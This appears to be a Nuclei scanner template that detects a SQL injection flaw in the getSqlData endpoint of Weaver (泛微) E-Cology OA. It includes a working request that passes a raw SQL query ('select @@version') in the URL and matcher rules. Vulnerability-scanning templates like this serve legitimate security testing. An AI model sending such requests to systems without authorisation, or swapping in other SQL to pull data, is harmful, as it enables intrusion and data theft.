id: fanweiOAgetSqlData

info:
  name: 泛微OA E-Cology getSqlData SQL注入漏洞
  author: cnaq
  severity: high    
  description: 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20getSqlData%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
  tags: sql,ecology,fanwei,oa


requests:
  - raw:
      - |
        GET /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        words:
          - 'api_status'


    

